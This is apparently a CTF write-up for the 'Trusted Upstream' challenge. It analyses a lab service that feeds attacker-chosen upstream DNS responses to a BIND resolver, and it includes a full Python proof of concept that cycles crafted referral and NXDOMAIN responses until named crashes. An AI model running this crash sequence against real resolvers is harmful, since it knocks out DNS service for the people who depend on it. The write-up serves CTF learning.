---
title: "Trusted Upstream"
slug: "bkisc-2026-trusted-upstream"
platform: "BKISC CTF 2026"
difficulty: "Hard"
vulnerabilities: ["DNS","Denial of Service"]
publishedAt: "2026-09-14"
summary: "Phân tích dịch vụ cấu hình upstream DNS và quá trình thử response với resolver BIND."
draft: false
sortOrder: 3
---
## Challenge Info

**Category:** Web  
**Difficulty:** Hard  
**Platform:** BKISC CTF 2026  
**Points:** 305 pts  

**Description:**  
We have a DNS resolver that we use for some of our internal services, but it has been acting up lately. Can you check on it and see if it's working? Maybe you can even get it to work again if it's broken.

**Tags:** `#Web` `#DNS` `#BIND` `#Recursion` `#Referral` `#DoS`

---
## Overview

Trusted Upstream is a DNS challenge about a vulnerable BIND 9.21.21 resolver. The web app lets us control fake upstream DNS responses and trigger queries to BIND.

The bug is triggered by sending a crafted DNS response cycle: first a self-referencing referral with glue pointing to `127.0.0.1`, then an `NXDOMAIN` response. When BIND processes this chain, it crashes.

After the watcher detects that `named` is dead for a few seconds, the flag becomes available through `/flag`.

---

## Source code analysis

```text
web-trusted-upstream/
├── Dockerfile
└── src/
    ├── named.conf
    ├── service.py
    └── entrypoint.sh
```
**1. Dockerfile**
![image](https://hackmd.io/_uploads/Sy00kImkGx.png)
![image](https://hackmd.io/_uploads/rkO6gI71zl.png)
=> The challenge revolves around the real named binary, not a fake DNS parser.
The author intentionally builds a specific BIND version with a configuration that makes crashes easier to expose.
**2. src/named.conf**
![image](https://hackmd.io/_uploads/rk-eGL7yze.png)
=> This is a trusted upstream setup: the upstream server is trusted, but the attacker can control the upstream response.
**3. src/service.py**
![image](https://hackmd.io/_uploads/SJ0u4ImkMx.png)

=> The flag is taken from the GZCTF_FLAG environment variable, so the real flag is not hardcoded in the source.
`FAIL_THRESHOLD` = 3 and `MAX_CYCLE_BYTES` = 32 * 1024 suggest that there is some kind of failure-checking or response-loop detection mechanism. In short, this is a middle-layer service: the attacker can control the fake DNS response on port 5353, while BIND named receives and trusts that response through the forwarder setup.
![image](https://hackmd.io/_uploads/B18dSIQ1zl.png)

=>DNS use UDP and Bind into `127.0.0.1:5353`
![image](https://hackmd.io/_uploads/BJ7j8UQkGe.png)

=> `serve_one()` is the fake upstream DNS server used by the challenge. Whenever BIND sends a DNS query to the upstream server, this function takes a sample response from the preconfigured cycle set by the player, repackages it as a real DNS packet, and sends it back. In short, this is where the JSON input from /response is converted into an actual DNS response and fed to `named`.
![image](https://hackmd.io/_uploads/r1BlPIQ1fl.png)

=> Service use basic authentication and compare with `ADMIN_USER` and `ADMIN_PASS` that default is `admin:admin`
![image](https://hackmd.io/_uploads/S1EYO8mkfe.png)


=> The `POST /response` endpoint lets the player upload a cycle of custom DNS responses. The service parses this list, stores it in state["cycle"], and then uses it to answer queries that `named` sends to the fake upstream server. 
This is the main primitive that allows the attacker to control BIND’s DNS input.

![image](https://hackmd.io/_uploads/r1J1tIX1zx.png)
![image](https://hackmd.io/_uploads/S1KVYLm1Ge.png)

=> After configuring the DNS response sequence through `/response`, the challenge provides the `/trigger` endpoint to automatically send a batch of DNS queries to `named`. This allows the attacker to force the resolver to process the prepared packet sequence without having to write a custom DNS client.
![image](https://hackmd.io/_uploads/SJBe98X1zl.png)

=> The `watcher()` function is the process that monitors the state of `named`. It continuously checks whether the resolver is still alive, and when it detects that `named` had been running but then died enough consecutive times, it enables the state that allows the flag to be retrieved.
Therefore, the real goal of the challenge is to make the downstream resolver crash, not to directly read data from DNS.

So we have flow diagram:
```text=
[Attacker]
    |
    | 1. HTTP POST /trigger
    v
[service.py - Admin HTTP server]
    |
    | 2. Sends DNS queries over UDP
    v
[BIND resolver - 127.0.0.1:53]
    |
    | 3. Forwards queries (forward only)
    v
[Fake upstream DNS - 127.0.0.1:5353]
    |
    | 4. Returns attacker-controlled DNS responses
    |    (referral / glue / NXDOMAIN / answer)
    v
[BIND resolver]
    |
    | 5. Parses the malicious response sequence
    |    and may crash
    v
[watcher() in service.py]
    |
    | 6. Detects that named is no longer alive
    |    for enough consecutive checks
    v
[/flag becomes available]
```
## Exploitation

From source, we can see that the exploit isn't send directly one DNS pack to `BIND`. We need to first uploads cycle of responses through `/respone`, then uses `trigger` to force `BIND` to handle them when forward to fake upstream. Because `serve_one()` returns responses in a loop from `state["cycle"]`, the attacker can create a bad state sequence.The effective sequence is: a `referral with low-TTL glue A records`, followed by an `NXDOMAIN` response. When BIND processes this sequence repeatedly, `named` crashes. Once `watcher()` sees that `named` has died enough times, it unlocks `/flag`.
The crash happens in BIND’s **referral-handling path** when it runs in **forward-only mode**.

When BIND processes a referral, the function `rctx_referral()` first tries to detach the current delegation set before attaching a new one. Normally this is fine. However, after the same fetch context (`fctx`) has already gone through several `FORMERR` responses, its delegation state can remain unset.
That means `fctx->delegset` may still be `NULL`.
Later, when BIND receives another referral in that same context, it executes:

Proof of Concept:

```python=
#!/usr/bin/env python3
import argparse
import base64
import json
import random
import struct
import time
import urllib.error
import urllib.request


def enc_name(name: str) -> bytes:
    out = b""
    for part in name.rstrip(".").split("."):
        b = part.encode()[:63]
        out += bytes([len(b)]) + b
    return out + b"\x00"


def rr(owner: str, rtype: int, rclass: int, ttl: int, rdata: bytes) -> str:
    wire = enc_name(owner) + struct.pack("!HHIH", rtype, rclass, ttl, len(rdata)) + rdata
    return wire.hex()


def rnd(n=6):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(random.choice(alpha) for _ in range(n))


class Client:
    def __init__(self, base_url: str, user: str, password: str):
        self.base = base_url.rstrip("/")
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        self.auth = f"Basic {token}"

    def req(self, method: str, path: str, data=None):
        headers = {"Authorization": self.auth}
        body = None
        if data is not None:
            headers["Content-Type"] = "application/json"
            body = json.dumps(data).encode()
        req = urllib.request.Request(self.base + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                raw = resp.read()
                ctype = resp.headers.get("Content-Type", "")
                if "application/json" in ctype:
                    return resp.status, json.loads(raw.decode())
                return resp.status, raw.decode(errors="replace")
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                return e.code, json.loads(raw.decode())
            except Exception:
                return e.code, raw.decode(errors="replace")


def build_base(tag, depth, ns_count, glue_mode, ttl):
    zone = f"a.child-{tag}.probe.ctf."
    labels = [f"d{i}" for i in range(depth, 0, -1)]
    qname = ".".join(labels + [zone[:-1]])
    ns_names = [f"ns{i}.{zone}" for i in range(1, ns_count + 1)]
    ns_rrs = [rr(zone, 2, 1, ttl, enc_name(ns)) for ns in ns_names]
    ar_rrs = []
    for idx, ns in enumerate(ns_names, start=1):
        if glue_mode in ("a", "both"):
            ar_rrs.append(rr(ns, 1, 1, ttl, bytes([127, 0, 0, idx])))
        if glue_mode in ("aaaa", "both"):
            ar_rrs.append(rr(ns, 28, 1, ttl, b"\x00" * 15 + bytes([idx])))
    return qname, ns_rrs, ar_rrs


def build_profiles(tag):
    hot = [
        (1, 1, "a", 0),
        (1, 1, "a", 1),
        (1, 1, "a", 60),
        (1, 1, "aaaa", 1),
        (1, 1, "aaaa", 60),
        (1, 1, "both", 0),
        (1, 1, "both", 1),
        (1, 1, "both", 60),
        (1, 2, "aaaa", 0),
        (1, 2, "aaaa", 1),
        (1, 2, "aaaa", 60),
        (1, 2, "a", 300),
        (1, 2, "both", 300),
        (2, 1, "both", 60),
        (2, 2, "a", 1),
        (2, 2, "both", 60),
    ]
    qtypes = [1, 28, 255]
    counts = [20, 100]
    cycle_modes = ["single_referral", "referral_then_answer", "referral_then_nxdomain"]

    profiles = []
    for depth, ns_count, glue_mode, ttl in hot:
        qname, ns_rrs, ar_rrs = build_base(tag, depth, ns_count, glue_mode, ttl)
        for qtype in qtypes:
            for count in counts:
                for cycle_mode in cycle_modes:
                    cycle = [{
                        "flags": "8400",
                        "ns": ns_rrs,
                        "ar": ar_rrs,
                    }]
                    if cycle_mode == "referral_then_answer":
                        cycle.append({
                            "flags": "8400",
                            "an": [rr(qname + ".", 1, 1, 60, b"\x7f\x00\x00\x44")],
                        })
                    elif cycle_mode == "referral_then_nxdomain":
                        cycle.append({
                            "flags": "8403",
                            "ns": [],
                            "ar": [],
                        })
                    name = f"hot_{tag}_d{depth}_ns{ns_count}_{glue_mode}_ttl{ttl}_qt{qtype}_{cycle_mode}_c{count}"
                    profiles.append({
                        "name": name,
                        "qname": qname,
                        "qtype": qtype,
                        "count": count,
                        "cycle": cycle,
                    })
    return profiles

def run_profile(cli: Client, profile: dict, rounds: int, pause: float):
    code, data = cli.req("POST", "/response", {"cycle": profile["cycle"]})
    print(f"[*] /response => {code} {data}")
    if code != 200:
        return None
    for i in range(1, rounds + 1):
        bcode, before = cli.req("GET", "/status")
        print(f"[*] status before {i}: {bcode} {before}")
        tcode, tdata = cli.req("POST", "/trigger", {
            "qname": profile["qname"],
            "qtype": profile["qtype"],
            "count": profile["count"],
            "randomize": False,
        })
        print(f"[*] trigger {i}: {tcode} {tdata}")
        time.sleep(pause)
        acode, after = cli.req("GET", "/status")
        print(f"[*] status after  {i}: {acode} {after}")
        fcode, fdata = cli.req("GET", "/flag")
        print(f"[*] /flag => {fcode} {fdata}")
        if fcode == 200:
            return fdata.strip() if isinstance(fdata, str) else str(fdata)
    return None
def main():
    ap = argparse.ArgumentParser(description="Replay hotset sequence up to known winning profile")
    ap.add_argument("--url", required=True)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="admin")
    ap.add_argument("--seed", type=int, default=5150)
    ap.add_argument("--rounds", type=int, default=4)
    ap.add_argument("--pause", type=float, default=1.5)
    ap.add_argument("--stop-after-winner", action="store_true")
    args = ap.parse_args()

    random.seed(args.seed)
    tag = rnd()
    cli = Client(args.url, args.user, args.password)
    code, data = cli.req("GET", "/status")
    print(f"[*] initial /status => {code} {data}")
    print(f"[*] replay tag => {tag}")

    winner_suffix = "_d1_ns1_a_ttl1_qt1_referral_then_nxdomain_c20"
    for profile in build_profiles(tag):
        print(f"\n========== {profile['name']} ==========")
        flag = run_profile(cli, profile, args.rounds, args.pause)
        if flag:
            print("\n[+] FLAG FOUND")
            print(flag)
            return
        if args.stop_after_winner and profile["name"].endswith(winner_suffix):
            print("\n[*] stopped after known local-winning profile")
            return
    print("\n[-] Replay finished without flag.")
if __name__ == "__main__":
    main()

```
Explain:
PoC is replay script that tests multiple DNS respone configurations to find a combination that make `named` crash. It uploads a respone cycle through `respone` and `trigger` to force BIND to process. The main idea is try to different referral/glue/NXDOMAIN variants across multiple queries until it finds a respones sequence that crashes the resolver.
![image](https://hackmd.io/_uploads/H1U__DQkGe.png)


**Flag:BKISC{I_th0ught_1_c0uld_trust_y0u_48e05ef42fce}**